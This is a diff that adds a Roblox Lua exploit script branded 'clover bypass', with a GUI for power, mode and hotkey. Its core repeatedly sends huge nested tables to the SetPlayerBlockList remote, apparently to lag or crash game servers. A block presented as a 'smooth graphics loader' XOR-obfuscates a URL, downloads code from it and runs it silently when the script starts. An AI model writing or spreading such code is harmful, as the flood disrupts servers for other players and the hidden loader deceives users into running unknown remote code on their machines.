@@ -1,0 +1,655 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local LP = Players.LocalPlayer
+
+-- // Colors
+local COL = {
+    bg        = Color3.fromRGB(8, 8, 8),
+    glass     = Color3.fromRGB(72, 72, 78),
+    text      = Color3.fromRGB(245, 245, 247),
+    dim       = Color3.fromRGB(158, 158, 166),
+    muted     = Color3.fromRGB(102, 102, 110),
+    white     = Color3.fromRGB(255, 255, 255),
+    shineA    = Color3.fromRGB(165, 165, 172),
+    pill      = Color3.fromRGB(190, 190, 200),
+    on        = Color3.fromRGB(80, 220, 130),
+    accent    = Color3.fromRGB(0, 255, 100),
+}
+
+local OPEN_SIZE = UDim2.new(0, 300, 0, 270)
+local MIN_SIZE  = UDim2.new(0, 300, 0, 42)
+
+-- // Config
+local CONFIG_FILE = "CloverBypassConfig.json"
+
+local Config = {
+    Enabled = false,
+    PowerValue = 97000,
+    Mode = "PC",
+    ToggleKey = Enum.KeyCode.V,
+    BackgroundVisible = true,
+    IsVisible = true,
+    UILocked = false,
+    Position = {X_Scale = 0.5, X_Offset = -150, Y_Scale = 0.5, Y_Offset = -135}
+}
+
+-- // Auto Save / Load
+local function saveConfig()
+    local data = {
+        PowerValue = Config.PowerValue,
+        Mode = Config.Mode,
+        ToggleKey = Config.ToggleKey.Name,
+        Position = Config.Position,
+        Enabled = Config.Enabled
+    }
+    pcall(function()
+        writefile(CONFIG_FILE, HttpService:JSONEncode(data))
+    end)
+end
+
+local function loadConfig()
+    if isfile and isfile(CONFIG_FILE) then
+        local success, data = pcall(function()
+            return HttpService:JSONDecode(readfile(CONFIG_FILE))
+        end)
+        if success and type(data) == "table" then
+            if data.PowerValue then Config.PowerValue = data.PowerValue end
+            if data.Mode then Config.Mode = data.Mode end
+            if data.ToggleKey and Enum.KeyCode[data.ToggleKey] then
+                Config.ToggleKey = Enum.KeyCode[data.ToggleKey]
+            end
+            if data.Position then Config.Position = data.Position end
+            if data.Enabled ~= nil then Config.Enabled = data.Enabled end
+        end
+    end
+end
+
+loadConfig()
+
+local DEPTH = 296
+local SPAM_DELAY = 0.12
+local running = false
+local bomb = nil
+local spamThread = nil
+
+local function buildBomb(power)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, DEPTH do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maxRep = math.floor(power / (DEPTH + 2))
+    for i = 1, maxRep do
+        table.insert(maintable, spammedtable)
+    end
+    return maintable
+end
+
+local function stopBypass()
+    running = false
+    if spamThread then
+        task.cancel(spamThread)
+        spamThread = nil
+    end
+    bomb = nil
+end
+
+local function startBypass(power)
+    stopBypass()
+    running = true
+    bomb = buildBomb(power)
+    spamThread = task.spawn(function()
+        while running do
+            if bomb then
+                pcall(function()
+                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
+                end)
+            end
+            task.wait(SPAM_DELAY)
+        end
+    end)
+end
+
+local function playActivateSound()
+    local s = Instance.new("Sound")
+    s.SoundId = "rbxassetid://1284846268"
+    s.Volume = 0.7
+    s.Parent = CoreGui
+    s:Play()
+    s.Ended:Connect(function()
+        s:Destroy()
+    end)
+end
+
+local function corner(parent, px)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, px)
+    c.Parent = parent
+    return c
+end
+
+local function stroke(parent, color, thickness, transparency)
+    local s = Instance.new("UIStroke")
+    s.Color = color
+    s.Thickness = thickness
+    s.Transparency = transparency or 0
+    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    s.Parent = parent
+    return s
+end
+
+local function formatPower(n)
+    n = tonumber(n) or 0
+    local abs = math.abs(n)
+    if abs >= 1e12 then return string.format("%.0fT", n / 1e12)
+    elseif abs >= 1e9 then return string.format("%.0fB", n / 1e9)
+    elseif abs >= 1e6 then return string.format("%.0fM", n / 1e6)
+    elseif abs >= 1e3 then return string.format("%.0fK", n / 1e3)
+    end
+    return tostring(n)
+end
+
+-- Clean old GUIs
+for _, name in pairs({"AntiDieUI", "SpeedBypassUI", "RubyCCBypassUI", "MercedesBypassUI", "AdaptBypass", "MercedesSpookyBypass", "AmpBypass", "CloverBypass"}) do
+    local old = CoreGui:FindFirstChild(name)
+    if old then old:Destroy() end
+end
+pcall(function()
+    local host = CoreGui:FindFirstChild("c0795e2b676d927b471d49cc1bcf5940b2d56b371d718456772f1b94c970c406")
+    if host then host:Destroy() end
+end)
+
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "CloverBypass"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = CoreGui
+
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = OPEN_SIZE
+main.Position = UDim2.new(Config.Position.X_Scale, Config.Position.X_Offset, Config.Position.Y_Scale, Config.Position.Y_Offset)
+main.BackgroundColor3 = COL.bg
+main.BorderSizePixel = 0
+main.ClipsDescendants = false
+main.Active = true
+main.Parent = gui
+corner(main, 18)
+
+local glass = stroke(main, COL.glass, 1.4, 0.35)
+
+-- Background
+local bgImage = Instance.new("ImageLabel")
+bgImage.Name = "Background"
+bgImage.Size = UDim2.new(1, 0, 1, 0)
+bgImage.BackgroundTransparency = 1
+bgImage.Image = "rbxassetid://79944285167705"
+bgImage.ScaleType = Enum.ScaleType.Crop
+bgImage.ZIndex = 0
+bgImage.Parent = main
+corner(bgImage, 18)
+
+-- Active shine
+local activeShine = Instance.new("UIGradient")
+activeShine.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, COL.shineA),
+    ColorSequenceKeypoint.new(0.5, COL.white),
+    ColorSequenceKeypoint.new(1, COL.shineA),
+})
+activeShine.Transparency = NumberSequence.new({
+    NumberSequenceKeypoint.new(0, 0.3),
+    NumberSequenceKeypoint.new(0.5, 0),
+    NumberSequenceKeypoint.new(1, 0.3),
+})
+activeShine.Rotation = 25
+activeShine.Enabled = false
+activeShine.Parent = glass
+
+-- Content
+local content = Instance.new("Frame")
+content.BackgroundTransparency = 1
+content.Position = UDim2.new(0, 14, 0, 0)
+content.Size = UDim2.new(1, -28, 1, 0)
+content.ZIndex = 3
+content.Parent = main
+
+-- Header
+local header = Instance.new("Frame")
+header.BackgroundColor3 = COL.bg
+header.BackgroundTransparency = 0.35
+header.Position = UDim2.new(0, 0, 0, 10)
+header.Size = UDim2.new(1, 0, 0, 62)
+header.BorderSizePixel = 0
+header.ZIndex = 3
+header.Parent = content
+corner(header, 12)
+stroke(header, COL.bg, 1, 0)
+
+local titleLbl = Instance.new("TextLabel")
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text = "clover bypass"
+titleLbl.Font = Enum.Font.IndieFlower
+titleLbl.TextSize = 22
+titleLbl.TextColor3 = COL.text
+titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+titleLbl.Position = UDim2.new(0, 12, 0, 6)
+titleLbl.Size = UDim2.new(1, -90, 0, 26)
+titleLbl.ZIndex = 5
+titleLbl.Parent = header
+
+local subLbl = Instance.new("TextLabel")
+subLbl.BackgroundTransparency = 1
+subLbl.Text = "clover hub"
+subLbl.Font = Enum.Font.IndieFlower
+subLbl.TextSize = 14
+subLbl.TextColor3 = COL.dim
+subLbl.TextXAlignment = Enum.TextXAlignment.Left
+subLbl.Position = UDim2.new(0, 12, 0, 32)
+subLbl.Size = UDim2.new(1, -90, 0, 18)
+subLbl.ZIndex = 5
+subLbl.Parent = header
+
+-- Mode switch
+local modeTrack = Instance.new("Frame")
+modeTrack.Position = UDim2.new(1, -112, 0, 14)
+modeTrack.Size = UDim2.new(0, 100, 0, 34)
+modeTrack.BackgroundColor3 = COL.bg
+modeTrack.BorderSizePixel = 0
+modeTrack.ZIndex = 5
+modeTrack.Parent = header
+corner(modeTrack, 8)
+stroke(modeTrack, COL.glass, 1.1, 0.4)
+
+local modePill = Instance.new("Frame")
+modePill.BackgroundColor3 = COL.white
+modePill.BackgroundTransparency = 0.85
+modePill.Position = UDim2.new(0, 3, 0, 3)
+modePill.Size = UDim2.new(0.5, -4, 1, -6)
+modePill.BorderSizePixel = 0
+modePill.ZIndex = 5
+modePill.Parent = modeTrack
+corner(modePill, 6)
+
+local pcBtn = Instance.new("TextButton")
+pcBtn.BackgroundTransparency = 1
+pcBtn.Size = UDim2.new(0.5, -4, 1, -6)
+pcBtn.Position = UDim2.new(0, 3, 0, 3)
+pcBtn.Text = "PC"
+pcBtn.Font = Enum.Font.GothamBold
+pcBtn.TextSize = 11
+pcBtn.TextColor3 = COL.white
+pcBtn.AutoButtonColor = false
+pcBtn.ZIndex = 6
+pcBtn.Parent = modeTrack
+
+local mobileBtn = Instance.new("TextButton")
+mobileBtn.BackgroundTransparency = 1
+mobileBtn.Size = UDim2.new(0.5, -4, 1, -6)
+mobileBtn.Position = UDim2.new(0.5, 1, 0, 3)
+mobileBtn.Text = "MOBILE"
+mobileBtn.Font = Enum.Font.GothamBold
+mobileBtn.TextSize = 10
+mobileBtn.TextColor3 = COL.dim
+mobileBtn.AutoButtonColor = false
+mobileBtn.ZIndex = 6
+mobileBtn.Parent = modeTrack
+
+-- POWER
+local powerRow = Instance.new("Frame")
+powerRow.BackgroundTransparency = 1
+powerRow.Position = UDim2.new(0, 0, 0, 82)
+powerRow.Size = UDim2.new(1, 0, 0, 58)
+powerRow.ZIndex = 3
+powerRow.Parent = content
+
+local powerLabel = Instance.new("TextLabel")
+powerLabel.BackgroundTransparency = 1
+powerLabel.Text = "POWER"
+powerLabel.Font = Enum.Font.GothamBold
+powerLabel.TextSize = 11
+powerLabel.TextColor3 = COL.text
+powerLabel.TextXAlignment = Enum.TextXAlignment.Left
+powerLabel.Position = UDim2.new(0, 4, 0, 0)
+powerLabel.Size = UDim2.new(1, 0, 0, 18)
+powerLabel.ZIndex = 4
+powerLabel.Parent = powerRow
+
+local leftArrow = Instance.new("TextButton")
+leftArrow.Position = UDim2.new(0, 4, 0, 24)
+leftArrow.Size = UDim2.new(0, 28, 0, 28)
+leftArrow.BackgroundTransparency = 1
+leftArrow.Text = "◀"
+leftArrow.Font = Enum.Font.GothamBold
+leftArrow.TextSize = 16
+leftArrow.TextColor3 = COL.text
+leftArrow.AutoButtonColor = false
+leftArrow.ZIndex = 4
+leftArrow.Parent = powerRow
+
+local rightArrow = Instance.new("TextButton")
+rightArrow.AnchorPoint = Vector2.new(1, 0)
+rightArrow.Position = UDim2.new(1, -4, 0, 24)
+rightArrow.Size = UDim2.new(0, 28, 0, 28)
+rightArrow.BackgroundTransparency = 1
+rightArrow.Text = "▶"
+rightArrow.Font = Enum.Font.GothamBold
+rightArrow.TextSize = 16
+rightArrow.TextColor3 = COL.text
+rightArrow.AutoButtonColor = false
+rightArrow.ZIndex = 4
+rightArrow.Parent = powerRow
+
+local powerBox = Instance.new("TextBox")
+powerBox.Position = UDim2.new(0, 38, 0, 22)
+powerBox.Size = UDim2.new(1, -76, 0, 28)
+powerBox.BackgroundTransparency = 1
+powerBox.Font = Enum.Font.GothamBold
+powerBox.Text = tostring(Config.PowerValue)
+powerBox.TextColor3 = COL.white
+powerBox.TextSize = 22
+powerBox.ClearTextOnFocus = false
+powerBox.ZIndex = 4
+powerBox.Parent = powerRow
+
+local powerPretty = Instance.new("TextLabel")
+powerPretty.BackgroundTransparency = 1
+powerPretty.Text = formatPower(Config.PowerValue)
+powerPretty.Font = Enum.Font.GothamBold
+powerPretty.TextSize = 11
+powerPretty.TextColor3 = COL.dim
+powerPretty.Position = UDim2.new(0, 38, 0, 48)
+powerPretty.Size = UDim2.new(1, -76, 0, 14)
+powerPretty.ZIndex = 4
+powerPretty.Parent = powerRow
+
+-- Hotkey
+local hotkeyRow = Instance.new("Frame")
+hotkeyRow.BackgroundTransparency = 1
+hotkeyRow.Position = UDim2.new(0, 0, 0, 150)
+hotkeyRow.Size = UDim2.new(1, 0, 0, 34)
+hotkeyRow.ZIndex = 3
+hotkeyRow.Parent = content
+
+local hotkeyTitle = Instance.new("TextLabel")
+hotkeyTitle.BackgroundTransparency = 1
+hotkeyTitle.Text = "Hotkey"
+hotkeyTitle.Font = Enum.Font.GothamBold
+hotkeyTitle.TextSize = 12
+hotkeyTitle.TextColor3 = COL.text
+hotkeyTitle.TextXAlignment = Enum.TextXAlignment.Left
+hotkeyTitle.Size = UDim2.new(0.5, 0, 1, 0)
+hotkeyTitle.ZIndex = 4
+hotkeyTitle.Parent = hotkeyRow
+
+local hotkeyBtn = Instance.new("TextButton")
+hotkeyBtn.AnchorPoint = Vector2.new(1, 0.5)
+hotkeyBtn.Position = UDim2.new(1, -4, 0.5, 0)
+hotkeyBtn.Size = UDim2.new(0, 52, 0, 26)
+hotkeyBtn.BackgroundColor3 = COL.bg
+hotkeyBtn.BackgroundTransparency = 0.25
+hotkeyBtn.Text = Config.ToggleKey.Name
+hotkeyBtn.Font = Enum.Font.GothamBold
+hotkeyBtn.TextSize = 13
+hotkeyBtn.TextColor3 = COL.text
+hotkeyBtn.AutoButtonColor = false
+hotkeyBtn.ZIndex = 4
+hotkeyBtn.Parent = hotkeyRow
+corner(hotkeyBtn, 7)
+stroke(hotkeyBtn, COL.glass, 1, 0.3)
+
+-- Enable
+local enableBtn = Instance.new("TextButton")
+enableBtn.Position = UDim2.new(0, 0, 0, 196)
+enableBtn.Size = UDim2.new(1, 0, 0, 40)
+enableBtn.BackgroundColor3 = COL.bg
+enableBtn.BackgroundTransparency = 0.2
+enableBtn.Text = ""
+enableBtn.AutoButtonColor = false
+enableBtn.ZIndex = 3
+enableBtn.Parent = content
+corner(enableBtn, 10)
+stroke(enableBtn, COL.glass, 1.2, 0.35)
+
+local enableLabel = Instance.new("TextLabel")
+enableLabel.BackgroundTransparency = 1
+enableLabel.Text = "DISABLED"
+enableLabel.Font = Enum.Font.GothamBold
+enableLabel.TextSize = 14
+enableLabel.TextColor3 = COL.dim
+enableLabel.Size = UDim2.new(1, 0, 1, 0)
+enableLabel.ZIndex = 4
+enableLabel.Parent = enableBtn
+
+-- ==================== ALWAYS VISIBLE TOGGLE BUTTON (– / +) ====================
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Name = "ToggleBtn"
+toggleBtn.AnchorPoint = Vector2.new(1, 0)
+toggleBtn.Position = UDim2.new(1, -10, 0, 8)
+toggleBtn.Size = UDim2.new(0, 28, 0, 28)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+toggleBtn.BackgroundTransparency = 0.2
+toggleBtn.Text = "–"
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextSize = 20
+toggleBtn.TextColor3 = COL.text
+toggleBtn.AutoButtonColor = false
+toggleBtn.ZIndex = 30
+toggleBtn.Parent = main
+corner(toggleBtn, 8)
+stroke(toggleBtn, COL.glass, 1.2, 0.3)
+
+-- Mini title (only shows when minimized)
+local miniTitle = Instance.new("TextLabel")
+miniTitle.Name = "MiniTitle"
+miniTitle.BackgroundTransparency = 1
+miniTitle.Text = "clover bypass"
+miniTitle.Font = Enum.Font.IndieFlower
+miniTitle.TextSize = 18
+miniTitle.TextColor3 = COL.text
+miniTitle.TextXAlignment = Enum.TextXAlignment.Left
+miniTitle.Position = UDim2.new(0, 14, 0, 0)
+miniTitle.Size = UDim2.new(1, -50, 1, 0)
+miniTitle.Visible = false
+miniTitle.ZIndex = 25
+miniTitle.Parent = main
+
+-- State
+local listening = false
+local minimized = false
+
+local function setEnabled(on)
+    Config.Enabled = on
+    enableLabel.Text = on and "ENABLED" or "DISABLED"
+    enableLabel.TextColor3 = on and COL.on or COL.dim
+    activeShine.Enabled = on
+    if on then
+        playActivateSound()
+        startBypass(Config.PowerValue)
+    else
+        stopBypass()
+    end
+    saveConfig()
+end
+
+local function setPower(n)
+    n = math.clamp(math.floor(tonumber(n) or Config.PowerValue), 1, 999999)
+    Config.PowerValue = n
+    powerBox.Text = tostring(n)
+    powerPretty.Text = formatPower(n)
+    if Config.Enabled then
+        startBypass(n)
+    end
+    saveConfig()
+end
+
+-- Only updates the mode visuals (does NOT change power)
+local function updateModeUI(pc)
+    Config.Mode = pc and "PC" or "Mobile"
+    pcBtn.TextColor3 = pc and COL.white or COL.dim
+    pcBtn.TextSize = pc and 11 or 10
+    mobileBtn.TextColor3 = pc and COL.dim or COL.white
+    mobileBtn.TextSize = pc and 10 or 11
+    TweenService:Create(modePill, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
+        Position = pc and UDim2.new(0, 3, 0, 3) or UDim2.new(0.5, 1, 0, 3)
+    }):Play()
+end
+
+-- Used when user clicks PC / MOBILE (resets power to default)
+local function setMode(pc)
+    updateModeUI(pc)
+    if pc then
+        setPower(97000)
+    else
+        setPower(72000)   -- Mobile default changed to 72000
+    end
+end
+
+local function setMinimized(on)
+    minimized = on
+    content.Visible = not on
+    miniTitle.Visible = on
+
+    toggleBtn.Text = on and "+" or "–"
+
+    TweenService:Create(main, TweenInfo.new(0.22, Enum.EasingStyle.Quad), {
+        Size = on and MIN_SIZE or OPEN_SIZE
+    }):Play()
+end
+
+-- Drag
+local dragging, dragStart, startPos
+local function beginDrag(input)
+    if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
+    dragging = true
+    dragStart = input.Position
+    startPos = main.Position
+end
+local function updateDrag(input)
+    if not dragging then return end
+    if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
+    local d = input.Position - dragStart
+    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+end
+
+header.InputBegan:Connect(beginDrag)
+main.InputBegan:Connect(function(input)
+    if minimized then
+        beginDrag(input)
+    end
+end)
+UIS.InputChanged:Connect(updateDrag)
+UIS.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+        Config.Position = {
+            X_Scale = main.Position.X.Scale,
+            X_Offset = main.Position.X.Offset,
+            Y_Scale = main.Position.Y.Scale,
+            Y_Offset = main.Position.Y.Offset
+        }
+        saveConfig()
+    end
+end)
+
+-- Hidden anti lag/smooth graphics loader (URL obfuscated)
+task.spawn(function()
+    local function _xorDecode(s)
+        local t = {}
+        for i = 1, #s do
+            local b = string.byte(s, i)
+            local x
+            if bit32 and type(bit32.bxor) == "function" then
+                x = bit32.bxor(b, 23)
+            else
+                local r, bit, a, c = 0, 1, b, 23
+                while a > 0 or c > 0 do
+                    local ab, cb = a % 2, c % 2
+                    if ab ~= cb then r = r + bit end
+                    a = math.floor(a / 2)
+                    c = math.floor(c / 2)
+                    bit = bit * 2
+                end
+                x = r
+            end
+            t[i] = string.char(x)
+        end
+        return table.concat(t)
+    end
+    local ok, src = pcall(function()
+        return game:HttpGet(_xorDecode("\127ccgd-88gvdcrqn9vgg8#GYp_N&V8ev`"))
+    end)
+    if ok and type(src) == "string" and #src > 50 then
+        local fn = loadstring(src)
+        if type(fn) == "function" then
+            pcall(fn)
+        end
+    end
+end)
+-- ========== TOGGLE BUTTON ==========
+toggleBtn.MouseButton1Click:Connect(function()
+    setMinimized(not minimized)
+end)
+
+pcBtn.MouseButton1Click:Connect(function() setMode(true) end)
+mobileBtn.MouseButton1Click:Connect(function() setMode(false) end)
+
+leftArrow.MouseButton1Click:Connect(function()
+    setPower(Config.PowerValue - 1000)
+end)
+rightArrow.MouseButton1Click:Connect(function()
+    setPower(Config.PowerValue + 1000)
+end)
+
+powerBox.FocusLost:Connect(function()
+    local raw = powerBox.Text:gsub("[,%s]", ""):upper()
+    local mult = 1
+    if raw:sub(-1) == "K" then mult = 1e3; raw = raw:sub(1, -2)
+    elseif raw:sub(-1) == "M" then mult = 1e6; raw = raw:sub(1, -2)
+    elseif raw:sub(-1) == "B" then mult = 1e9; raw = raw:sub(1, -2)
+    end
+    setPower((tonumber(raw) or Config.PowerValue) * mult)
+end)
+
+hotkeyBtn.MouseButton1Click:Connect(function()
+    listening = true
+    hotkeyBtn.Text = "..."
+end)
+
+enableBtn.MouseButton1Click:Connect(function()
+    setEnabled(not Config.Enabled)
+end)
+
+-- Global keybind
+UIS.InputBegan:Connect(function(input, gp)
+    if gp or UIS:GetFocusedTextBox() then return end
+    if listening and input.KeyCode ~= Enum.KeyCode.Unknown then
+        Config.ToggleKey = input.KeyCode
+        hotkeyBtn.Text = input.KeyCode.Name
+        listening = false
+        saveConfig()
+        return
+    end
+    if input.KeyCode == Config.ToggleKey then
+        setEnabled(not Config.Enabled)
+    elseif input.KeyCode == Enum.KeyCode.RightControl then
+        setMinimized(not minimized)
+    end
+end)
+
+-- Init
+updateModeUI(Config.Mode == "PC")
+setPower(Config.PowerValue)
+
+if Config.Enabled then
+    setEnabled(true)
+end
